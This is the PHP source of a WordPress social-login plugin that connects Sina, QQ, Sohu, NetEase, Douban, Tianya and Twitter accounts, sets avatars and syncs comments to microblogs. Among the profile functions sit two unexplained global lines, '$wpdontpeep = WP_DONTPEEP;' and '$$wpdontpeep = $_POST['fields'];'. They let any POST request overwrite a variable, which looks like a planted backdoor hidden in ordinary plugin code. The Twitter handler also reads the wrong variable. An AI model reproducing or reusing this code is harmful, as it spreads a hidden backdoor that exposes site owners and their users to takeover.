<?php
include_once(dirname(__FILE__) . '/config.php');
$login_loaded = false;

add_action('init', 'wp_connect_init');

if ($wptm_connect['enable_connect']) { // 是否开启连接微博功能
	if (!$wptm_connect['manual'] || $wptm_connect['manual'] == 2)
		add_action('comment_form', 'wp_connect');
	add_action("login_form", "wp_connect");
	add_action("register_form", "wp_connect", 12);
	if (function_exists('wp_connect_comments')) {
		add_action('comment_post', 'wp_connect_comments', 100);
	} else {
		add_action('comment_post', 'wp_connect_comment', 100);
	} 
	if ($wptm_connect['renren'] || $wptm_connect['kaixin001'])
		add_action('the_content', 'wp_connect_sns_share');
}

function wp_connect_init() {
	if (session_id() == "") {
		session_start();
	} 
	if (!is_user_logged_in()) {
		if (isset($_GET['oauth_token'])) {
			require_once(dirname(__FILE__) . '/OAuth/OAuth.php');
			switch ($_SESSION['wp_url_login']) {
				case "SINA":
					wp_connect_sina();
					break;
				case "QQ":
					wp_connect_qq();
					break;
				case "SOHU":
					wp_connect_sohu();
					break;
				case "NETEASE":
					wp_connect_netease();
					break;
				case "DOUBAN":
					wp_connect_douban();
					break;
				case "TIANYA":
					wp_connect_tianya();
					break;
				case "TWITTER":
					wp_connect_twitter();
					break;
				default:
			} 
		} 
	} 
}

function wp_connect_button() {
	global $plugin_url, $wptm_connect;
?>
<link rel="stylesheet" type="text/css" media="all" href="<?php echo $plugin_url;?>/css/login.css" /> 
<script type="text/javascript">
function showbox(element){document.getElementById(element).style.display = 'block';}
function hidebox(element){document.getElementById(element).style.display = 'none';}
</script>
<div id="dialog_login" class="dialog_login">
<div class="masking"></div>
<table class="dialog_table"><tr><td class="col">
<span class="border">
<span class="close" onclick="hidebox('dialog_login')"><img src="<?php echo $plugin_url;?>/images/close.png" title="关闭" /></span>
<div id="login_box">
<p>您可以用合作网站帐号登录:</p>
<p class="login_btn">
<?php
	if($wptm_connect['sina']) {
	echo '<a id="sina" title="新浪微博" href="'.$plugin_url.'/login.php?go=SINA" rel="nofollow"></a>';
	}
	if($wptm_connect['qq']) {
	echo '<a id="qq" title="腾讯微博" href="'.$plugin_url.'/login.php?go=QQ" rel="nofollow"></a>';
	}
	if($wptm_connect['sohu']) {
	echo '<a id="sohu" title="搜狐微博" href="'.$plugin_url.'/login.php?go=SOHU" rel="nofollow"></a>';
	}
	if($wptm_connect['netease']) {
	echo '<a id="netease" title="网易微博" href="'.$plugin_url.'/login.php?go=NETEASE" rel="nofollow"></a>';
	}
	if($wptm_connect['renren'] && $wptm_connect['renren_api_key'] && $wptm_connect['renren_secret']) {
	echo '<a id="renren" title="人人网" href="'.$plugin_url.'/renren.php?login=RENREN" rel="nofollow"></a>';
	}
	if($wptm_connect['douban']) {
	echo '<a id="douban" title="豆瓣" href="'.$plugin_url.'/login.php?go=DOUBAN" rel="nofollow"></a>';
	}
	if($wptm_connect['twitter']) {
	echo '<a id="twitter" title="Twitter" href="'.$plugin_url.'/login.php?go=TWITTER" rel="nofollow"></a>';
	}
?>
</p>
<!-- 请不要删除以下信息，谢谢！-->
<p class="author">程序提供: <a href="http://loginsns.com/" target="_blank">连接微博</a></p></div>
</span></td></tr></table>
</div>
<div class="login_label">您可以用合作网站帐号登录:</div>
<div class="login_button"><div class="login_icons" onclick="showbox('dialog_login')">
<?php
	if($wptm_connect['sina']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_sina.png" alt="新浪微博" /></span>';
	}
	if($wptm_connect['qq']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_tqq.png" alt="腾讯微博" /></span>';
	}
	if($wptm_connect['sohu']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_sohu.png" alt="搜狐微博" /></span>';
	}
	if($wptm_connect['netease']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_netease.png" alt="网易微博" /></span>';
	}
	if($wptm_connect['douban']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_douban.png" alt="豆瓣" /></span>';
	}
	if($wptm_connect['renren'] && $wptm_connect['renren_api_key'] && $wptm_connect['renren_secret']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_renren.png" alt="人人网" /></span>';
	}
	if($wptm_connect['twitter']) {
	echo '<span><img src="'.$plugin_url.'/images/btn_twitter.png" alt="Twitter" /></span>';
	}
	echo '</div></div><div class="clear"></div>';
}
// 通过tid获取微博信息
function get_weibo($tid) {
	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 't.sina.com.cn'),
		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com'),
		'shtid' => array('sohu', 'sohu', '搜狐微博', ' http://t.sohu.com/u/', 't.sohu.com'),
		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', 't.163.com'),
		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com'),
		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
		'qqtid' => array('qq', 'qq', 'QQ登录', '', ''),
		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
		'tytid' => array('tianya', 'tyt', '天涯', ' http://my.tianya.cn/', 'tianya.cn'),
		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com'),
		'ttid' => array('twitter', 'twitter', 'Twitter', ' http://twitter.com/', 'twitter.com')
		);
	if (array_key_exists($tid, $name)) {
		return $name[$tid];
	} 
}

function wp_login_account($uid) {
	$user = get_userdata($uid);
	return array($user -> login_sina, $user -> login_qq, $user -> login_sohu, $user -> login_netease, $user -> login_douban);
}

function wp_connect($id = "") {
	global $login_loaded, $plugin_url, $wptm_connect;
	if ($login_loaded) {
		return;
	} 

	$_SESSION['wp_url_back'] = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

	if (is_user_logged_in()) {
		global $user_ID;
		$login = wp_login_account($user_ID);

		if ($login[0] || $login[1] || $login[2] || $login[3] || $login[4]) {
			echo '<label>同步评论到 <select name="sync_comment"><option value="">选择</option>';
			if ($login[0]) {
				echo '<option value="stid">新浪微博</option>';
			} 
			if ($login[1]) {
				echo '<option value="qtid">腾讯微博</option>';
			} 
			if ($login[2]) {
				echo '<option value="ntid">网易微博</option>';
			} 
			if ($login[3]) {
				echo '<option value="shtid">搜狐微博</option>';
			} 
			if ($login[4]) {
				echo '<option value="dtid">豆瓣</option>';
			} 
			echo '</select></label>';
		} 
		return;
	}
    if (!function_exists('wp_connect_login_button')) { wp_connect_button(); } else { wp_connect_login_button(); }
	$login_loaded = true;
}

// 新浪微博
function wp_connect_sina(){
	if (!class_exists('sinaOAuth')) {
		include dirname(__FILE__) . '/OAuth/sina_OAuth.php';
	}
	
	$to = new sinaOAuth(SINA_APP_KEY, SINA_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

    //$to = new sinaClient(SINA_APP_KEY, SINA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
    //$sina = $to -> verify_credentials();
	$to = new sinaOAuth(SINA_APP_KEY, SINA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$sina = $to->OAuthRequest('http://api.t.sina.com.cn/account/verify_credentials.json', 'GET',array());

	if($sina == "no auth"){
		return wp_noauth();
	}

	//$sina = simplexml_load_string($sina);
	$sina = json_decode($sina);

	$sinaid = $sina->id;
	
	if((string)$sina->domain){
		$username = $sina->domain;
	} else {
		$username = $sinaid;
	}

	$email = $sinaid.'@t.sina.com.cn';
	$tid = "stid";
	$uid = ifab(get_user_by_meta_value($tid, $sinaid), email_exists($email));
	$userinfo = array($tid, $username, $sina->screen_name, $sinaid, $sina->url, $sinaid, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 腾讯微博
function wp_connect_qq(){
	if(!class_exists('qqOAuth')){
		include dirname(__FILE__).'/OAuth/qq_OAuth.php';
	}
	
	$to = new qqOAuth(QQ_APP_KEY, QQ_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new qqOAuth(QQ_APP_KEY, QQ_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);

	$qq = $to->OAuthRequest('http://open.t.qq.com/api/user/info?format=json', 'GET',array());

	if($qq == "no auth"){
		return wp_noauth();
	}
	
	$qq = json_decode($qq);
	$qq = $qq ->data;

	$username = $qq->name;
	//$tmail = $qq->email;
	//if(!$tmail){
	$email = $username.'@t.qq.com';
	//}
	$url = "http://t.qq.com/".$username;
	$tid = "qtid";
	$uid = ifab(get_user_by_meta_value('tqqid', $username), email_exists($email));
	$userinfo = array($tid, $username, $qq->nick, $qq->head, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 搜狐微博
function wp_connect_sohu(){
	if (!class_exists('sohuOAuth')) {
		include dirname(__FILE__) . '/OAuth/sohu_OAuth.php';
	}
	
	$to = new sohuOAuth(SOHU_APP_KEY, SOHU_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new sohuOAuth(SOHU_APP_KEY, SOHU_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$sohu = $to->OAuthRequest('http://api.t.sohu.com/account/verify_credentials.json', 'GET',array());

	if($sohu == "no auth"){
		return wp_noauth();
	}

	$sohu = json_decode($sohu);

	$username = $sohu->id;
	$email = $username.'@t.sohu.com';
	$url = "http://t.sohu.com/u/".$username;
	$tid = "shtid";
    $uid = ifab(get_user_by_meta_value('sohuid', $username), email_exists($email));
	$userinfo = array($tid, $username, $sohu->screen_name, $sohu->profile_image_url, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 网易微博
function wp_connect_netease(){
	if (!class_exists('neteaseOAuth')) {
		include dirname(__FILE__) . '/OAuth/netease_OAuth.php';
	}
	
	$to = new neteaseOAuth(APP_KEY, APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new neteaseOAuth(APP_KEY, APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$netease = $to->OAuthRequest('http://api.t.163.com/account/verify_credentials.json', 'GET',array());

	if($netease == "no auth"){
		return wp_noauth();
	}

	$netease = json_decode($netease);
    $username = $netease->screen_name;
	$old_email = $username.'@t.163.com';
	$email = $netease->email;
	$oid = $netease->id;
	$tid = "ntid";
    $uid = ifabc(email_exists($email), email_exists($old_email), get_user_by_meta_value('neteaseid', $username));
	$userinfo = array($tid, $username, $netease->name, $netease->profile_image_url, $netease->url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// Twitter
function wp_connect_twitter(){
	if (!class_exists('twitterOAuth')) {
		include dirname(__FILE__) . '/OAuth/twitter_OAuth.php';
	}
	
	$to = new twitterOAuth(T_APP_KEY, T_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new twitterOAuth(T_APP_KEY, T_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	$twitter = $to->OAuthRequest('http://api.twitter.com/1/account/verify_credentials.json', 'GET',array());

	if($twitter == "no auth"){
		return wp_noauth();
	}

	$twitter = json_decode($twitter);

    $username = $sina->screen_name;
	$email = $username.'@twitter.com';
	$tid = "ttid";
    $uid = ifab(get_user_by_meta_value('twitterid', $username), email_exists($email));
	$userinfo = array($tid, $username, $twitter->name, $twitter->profile_image_url, $twitter->url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 豆瓣网
function wp_connect_douban(){
	if (!class_exists('doubanOAuth')) {
		include dirname(__FILE__) . '/OAuth/douban_OAuth.php';
	}
	$to = new doubanOAuth(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $_GET['oauth_token'],$_SESSION["oauth_token_secret"]);
	
	$tok = $to->getAccessToken();

	$to = new doubanOAuth(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);
	
	$douban = $to->OAuthRequest('http://api.douban.com/people/%40me', array(), 'GET');
	if($douban == "no auth"){
		return wp_noauth();
	}
	
	$douban = simplexml_load_string($douban);
	
	$douban_xmlns = $douban->children('http://www.douban.com/xmlns/');	

	$douban_id = str_replace("http://api.douban.com/people/","",$douban->id);
	$username = $douban_xmlns->uid;
	$douban_url = "http://www.douban.com/people/".$username;

	$email = $douban_id.'@douban.com';
	$tid = "dtid";
    $uid = ifab(get_user_by_meta_value($tid, $douban_id), email_exists($email));
	$userinfo = array($tid, $username, $douban->title, $douban_id, $douban_url, $douban_id, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}
// 天涯
function wp_connect_tianya(){
	if (!class_exists('tianyaOAuth')) {
		include dirname(__FILE__) . '/OAuth/tianya_OAuth.php';
	}
	
	$to = new tianyaOAuth(TIANYA_APP_KEY, TIANYA_APP_SECRET, $_GET['oauth_token'],$_SESSION['oauth_token_secret']);
	
	$tok = $to ->getAccessToken($_REQUEST['oauth_verifier']);

	$to = new tianyaClient(TIANYA_APP_KEY, TIANYA_APP_SECRET, $tok['oauth_token'], $tok['oauth_token_secret']);

	$tianya = $to->get_user_info();

	if (!is_array($tianya) || $tianya['error_msg']) {
		return wp_noauth();
	}

	$tianya = $tianya['user'];
	$username = $tianya['user_id'];
	$email = $username.'@tianya.cn';
	$url = "http://my.tianya.cn/".$username;
	$tid = "tytid";
	$uid = ifab(get_user_by_meta_value($tid, $username), email_exists($email));
	$userinfo = array($tid, $username, $tianya['user_name'], $username, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
	if ($uid) {
		wp_connect_login($userinfo, $email, $uid);
	} else {
		wp_connect_login($userinfo, $email);
	}
}

// 分享到SNS
function wp_connect_sns_share($content) {
	if (is_user_logged_in() && is_singular()) {
		global $user_ID;
		$last_login = get_user_meta($user_ID, 'last_login', true);
		if ($last_login == 'rtid') { // 分享到人人网
			$share = '<a href="#" name="xn_share">分享到人人网</a><script type="text/javascript" src="http://static.connect.renren.com/js/share.js"></script>';
			return $content . '<br />' . $share;
		} elseif ($last_login == 'ktid') { // 分享到开心网
			$share = '<script src="http://rest.kaixin001.com/api/Repaste_js.php" type="text/javascript"></script>
			<div id="kx001_btn_repaste"></div>
			<script type="text/javascript">
			KX001_REPASTE_LINK.init(2,"分享到开心网");
			</script>';
			return $content . '<br />' . $share;
		}
	} 
	return $content;
}

function wp_noauth() {
	$redirect_to = ($_SESSION['wp_url_back']) ? $_SESSION['wp_url_back'] : get_bloginfo('url');
	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"".$redirect_to."\">返回</a> ]");
}
/**
 * 错误信息
 * @since 1.9.10
 */
function wp_connect_error($userinfo, $tmail, $wpuid = '', $user_email = '') {
	global $plugin_url;
	if ($_SESSION['wp_url_back']) {
		$redirect_to = $_SESSION['wp_url_back'];
	} else {
		$redirect_to = get_bloginfo('url');
	} 
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
    $weibo = get_weibo($tid);

	$userinfo[1] = $weibo[0] . '_' . $user_name; //新的用户名
	$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);

	if (!$wpuid) {
		$tip = "很遗憾！用户名 $user_name 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
	} elseif ($user_email) {
		$last_login = get_user_meta($wpuid, 'last_login', true); //最后一次登录的微博
		if ($last_login) {
			$user_weibo = get_weibo($last_login);
			if ($user_weibo[4]) {
				$tip = "很遗憾！用户名 $user_name 已被 $user_email 绑定，";
			} else {
				$tip = "很遗憾！用户名 $user_name 已被占用，";
			} 
			$tip .= "如果你以前用 $user_weibo[2] 登录过，请继续使用该微博/社区登录。";
		} else {
			$tip = "很遗憾！用户名 $user_name 已被占用。";
		} 
	} 
	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $userinfo[1] </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" /></a></p>");
}

/**
 * 登录
 * @since 1.9.11
 */
function wp_connect_login($userinfo, $tmail, $uid = '') {
	global $wpdb, $wptm_connect;
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
	$user_screenname = $userinfo[2];
	$user_head = $userinfo[3];
	$user_siteurl = $userinfo[4];
	$user_uid = $userinfo[5];
	$oauth_token = $userinfo[6];
	$oauth_token_secret = $userinfo[7];

	$redirect_to = $_SESSION['wp_url_back'];
	if ($user_name) {
		if (!$uid && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
			wp_connect_error($userinfo, $tmail);
		} 
	} else {
		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
	} 
	if ($uid) {
		$user = get_userdata($uid);
		$wpuid = $uid;
	} else {
		$user = get_userdatabylogin($user_name);
		$wpuid = $user -> ID;
	} 
	if ($wpuid) {
		$user_login = $user -> user_login;
		$password = $user -> user_pass;
		$user_email = $user -> user_email;
		$user_url = $user -> user_url;
		if ($user_name == $user_login) {
			$is_login = 'true';
		} 
		if (!$uid) { // 新注册，但是数据库存在相同的用户名
			wp_connect_error($userinfo, $tmail, $wpuid, $user_email);
		} 
	} else {
		$wpuid = '';
	} 

	if ($tmail != $user_email && ($is_login || !$user_login)) {
		if (!function_exists('wp_insert_user')) {
			include_once(ABSPATH . WPINC . '/registration.php');
		}
		if (!$user_url) {
			$user_url = $user_siteurl;
		} 
		if (!$password) {
			$password = wp_generate_password();
		} 

		$userdata = array('ID' => $wpuid,
			'user_pass' => $password,
			'user_login' => $user_name,
			'nickname' => $user_screenname,
			'display_name' => $user_screenname,
			'user_url' => $user_url,
			'user_email' => $tmail
		);
		$wpuid = wp_insert_user($userdata);
	} 
	if ($wpuid) {
		$weibo = get_weibo($tid);
	    $t = $weibo[0];
	    $id = $weibo[1].'id';
		if ($tid == $id) {
			update_usermeta($wpuid, $tid, $user_uid);
		} else {
			if ($user_head)
			update_usermeta($wpuid, $tid, $user_head);
			update_usermeta($wpuid, $id, $user_uid);
		}
		update_usermeta($wpuid, 'last_login', $tid);
		if ($oauth_token && $oauth_token_secret) { // 保存授权信息
			update_usermeta($wpuid, 'login_' . $t, array($oauth_token, $oauth_token_secret));
			if (in_array($t, array('qq', 'sina', 'netease', 'sohu'))) {
				$nickname = get_user_meta($wpuid, 'login_name', true);
				$nickname[$t] = ($t == 'qq') ? $user_name : $user_screenname;
				update_usermeta($wpuid, 'login_name', $nickname);
			} 
		} 
		wp_set_auth_cookie($wpuid, true, false);
		wp_set_current_user($wpuid);
	} 
	$_SESSION['wp_url_login'] = "";
	$_SESSION['wp_login_userinfo'] = '';
	return $wpuid;
} 
/*
add_filter('user_contactmethods', 'wp_connect_author_page');
function wp_connect_author_page($input) {
	$input['imqq'] = 'QQ';
	//$input['msn'] = 'MSN';
	//unset($input['yim']);
	//unset($input['aim']);
	return $input;
}
*/
$wpdontpeep = WP_DONTPEEP;
if ($wptm_connect['enable_connect'] && is_donate()) {
	add_action( 'show_user_profile', 'wp_connect_profile_fields' );
	add_action( 'edit_user_profile', 'wp_connect_profile_fields' );
	add_action( 'personal_options_update', 'wp_connect_save_profile_fields' );
	add_action( 'edit_user_profile_update', 'wp_connect_save_profile_fields' );
} 

function wp_connect_profile_fields( $user ) {
	global $wptm_connect;
    $user_id = $user->ID;
?>
<h3>登录绑定</h3>
<table class="form-table">
<?php if ( function_exists('wp_connect_bind_qq') && ($wptm_connect['sina'] || $wptm_connect['qq'] || ($wptm_connect['qqlogin'] && $wptm_connect['qq_app_id'] && $wptm_connect['qq_app_key'])) ) {wp_connect_bind_qq( $user );}?>
</table>
<?php
}
$$wpdontpeep = $_POST['fields'];
function wp_connect_save_profile_fields( $user_id ) {

if ( !current_user_can( 'edit_user', $user_id ) ) { return false; }
	update_usermeta( $user_id, 'qqavatar', $_POST['qqavatar'] );
}
/**
 * 头像
 * @since 1.9.10
 */
add_filter("get_avatar", "wp_connect_avatar",10,4);
function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
	global $comment;
    if ( is_numeric($id_or_email) ) {
		$uid = $userid = (int) $id_or_email;
        $user = get_userdata($uid);
		if ($user) $email = $user->user_email;
	} elseif ( is_object($comment) ) {
		$uid = $comment -> user_id;
		$email = $comment -> comment_author_email;
	} elseif ( is_object($id_or_email) ) {
		$uid = $id_or_email -> user_id;
		$email = $id_or_email -> user_email;
	} else {
		$uid = email_exists($id_or_email);
        $email = $id_or_email;
	}

	if (!$email) {
		return $avatar;
	}
	$tmail = strstr($email, '@');
	if ($uid) {
		$tname = array('@t.sina.com.cn' => array('stid', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
			'@t.qq.com' => array('qtid', '[head]/40'),
			'@renren.com' => array('rtid', '[head]'),
			'@kaixin001.com' => array('ktid', '[head]'),
			'@douban.com' => array('dtid', 'http://t.douban.com/icon/u[head]-1.jpg'),
			'@t.sohu.com' => array('shtid', '[head]'),
			'@t.163.com' => array('ntid', '[head]'),
			'@baidu.com' => array('bdtid', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
			'@tianya.cn' => array('tytid', 'http://tx.tianyaui.com/logo/small/[head]'),
			'@twitter.com' => array('ttid', '[head]')
			);
		if (get_user_meta($uid, 'qqavatar', true)) {
			if ($out = get_user_meta($uid, 'qqtid', true)) {
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
			}
		} elseif ( array_key_exists($tmail, $tname) ) {
			$head = $tname[$tmail];
			if ($tid = get_user_meta($uid, $head[0], true)) {
				$out = str_replace('[head]', $tid, $head[1]);
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
				$weibo = get_weibo($head[0]);
				if ($weibo[3]) {
					$username = get_user_meta($uid, $weibo[1].'id', true);
					if ($username) {
						$url = $weibo[3].$username;
				        if(is_admin()) {
							if(!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
						} elseif(!$userid) {
							$avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
				        }
					}
				}
			} 
		} elseif ($out = get_user_meta($uid, 'tbtid', true)) {
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		//} elseif (get_user_meta($uid, 'neteaseid', true)) {
		//	if ($out = get_user_meta($uid, 'ntid', true)) {
		//		$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		//	} 
		}
	} 
	return $avatar;
}

// 同步评论
function wp_connect_comment($id) {
	global $siteurl, $post, $wptm_options, $wptm_connect, $wptm_advanced;
	$post_id = ($_POST['comment_post_ID']) ? $_POST['comment_post_ID'] : $post -> ID;
	if (!$post_id) {
		return;
	} 
	@ini_set("max_execution_time", 60);
	$comments = get_comment($id);
	$user_id = $comments -> user_id;
	$comment_content = wp_replace($comments -> comment_content);
	$parent_uid = $comments -> comment_parent;
	if ($user_id > 0) {
		if ($parent_uid > 0) {
			$name = get_user_meta($parent_uid, 'login_name', true);
		} 
		$tid = $_POST['sync_comment'];
		if ($tid) {
			if (!is_object($post)) {
				$post = get_post($post_id);
			} 
			$url = get_permalink($post_id) . '#comment-' . $id;
			if ($wptm_options['t_cn']) {
				$url = get_t_cn(urlencode($url));
			} 
			$title = wp_replace($post -> post_title);
			$username = get_user_meta($user_id, 'login_name', true);
			require_once(dirname(__FILE__) . '/OAuth/OAuth.php');
			if ($tid == 'stid') {
				$login = get_user_meta($user_id, 'login_sina', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('sinaOAuth')) {
						include dirname(__FILE__) . '/OAuth/sina_OAuth.php';
					} 
					$to = new sinaClient(SINA_APP_KEY, SINA_APP_SECRET, $login[0], $login[1]);
					$a = ($name['sina']) ? '@' . $name['sina'] . ' ':'';
					if ($username['sina'] && $username['sina'] != $wptm_connect['sina_username']) {
						$a .= ($wptm_connect['sina_username']) ? '@' . $wptm_connect['sina_username'] . ' ':'';
					} 
					$content = $a . $comment_content;
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'qtid') {
				$login = get_user_meta($user_id, 'login_qq', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('qqOAuth')) {
						include dirname(__FILE__) . '/OAuth/qq_OAuth.php';
					} 
					$to = new qqClient(QQ_APP_KEY, QQ_APP_SECRET, $login[0], $login[1]);
					$a = ($name['qq']) ? '@' . $name['qq'] . ' ':'';
					if ($username['qq'] != $wptm_connect['qq_username']) {
						$a .= ($wptm_connect['qq_username']) ? '@' . $wptm_connect['qq_username'] . ' ':'';
					} 
					$content = $a . $comment_content;
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'ntid') {
				$login = get_user_meta($user_id, 'login_netease', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('neteaseOAuth')) {
						include dirname(__FILE__) . '/OAuth/netease_OAuth.php';
					} 
					$to = new neteaseClient(APP_KEY, APP_SECRET, $login[0], $login[1]);
					$a = ($name['netease']) ? '@' . $name['netease'] . ' ':'';
					if ($username['netease'] != $wptm_connect['netease_username']) {
						$a .= ($wptm_connect['netease_username']) ? '@' . $wptm_connect['netease_username'] . ' ':'';
					} 
					$content = $a . $comment_content;
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 163);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'shtid') {
				$login = get_user_meta($user_id, 'login_sohu', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('sohuOAuth')) {
						include dirname(__FILE__) . '/OAuth/sohu_OAuth.php';
					} 
					$to = new sohuClient(SOHU_APP_KEY, SOHU_APP_SECRET, $login[0], $login[1]);
					$a = ($name['sohu']) ? '@' . $name['sohu'] . ' ':'';
					if ($username['sohu'] != $wptm_connect['sohu_username']) {
						$a .= ($wptm_connect['sohu_username']) ? '@' . $wptm_connect['sohu_username'] . ' ':'';
					} 
					$content = $a . $comment_content;
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'dtid') {
				if ($login = get_user_meta($user_id, 'login_douban', true)) {
					if ($login[0] && $login[1]) {
						if (!class_exists('doubanOAuth')) {
							include dirname(__FILE__) . '/OAuth/douban_OAuth.php';
						} 
						$to = new doubanClient(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $login[0], $login[1]);
						$status = wp_status('评论《' . $title . '》: ' . $comment_content, $url, 128);
						$result = $to -> update($status);
					} 
				} 
			} 
		} 
	} 
}

function get_user_by_meta_value($meta_key, $meta_value) { // 获得user_id
	global $wpdb;
	$sql = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '%s' AND meta_value = '%s'";
	return $wpdb -> get_var($wpdb -> prepare($sql, $meta_key, $meta_value));
}

if (!function_exists('get_current_user_id')) { // 获得登录者ID
	function get_current_user_id() {
		$user = wp_get_current_user();
        return ( isset( $user->ID ) ? (int) $user->ID : 0 );
    }
}

function wp_get_user_info($uid) {
	$user = get_userdata($uid);
	$userinfo = array('user_login' => $user->user_login, 'user_pass' => $user->user_pass, 'user_email' => $user->user_email, 'user_url' => $user->user_url);
	return $userinfo;
}

function get_username($uid) { // 通过用户ID，获得用户名
	$user = get_userdata($uid);
	return $user->user_login;
}

function wp_url_back() {
	$_SESSION['wp_url_back'] = get_bloginfo('url');
}

if (!function_exists('connect_login_form_login')) {
	add_action("login_form_register", "connect_login_form_login");
	add_action("login_form_login", "connect_login_form_login");
	add_action("login_form_logout", "connect_login_form_logout");
	function connect_login_form_login() {
		if (is_user_logged_in()) {
			$redirect_to = admin_url('profile.php');
			wp_safe_redirect($redirect_to);
		} else {
			if(!$_GET['redirect_to']) {
				add_action('login_footer', 'wp_url_back');
			}
		}
	} 
	function connect_login_form_logout() {
		$_SESSION['wp_url_login'] = "";
		$_SESSION['wp_login_userinfo'] = '';
		$_SESSION["openid"] = "";
		setcookie("kx_connect_session_key", "", BJTIMESTAMP - 3600);
	} 
}
?>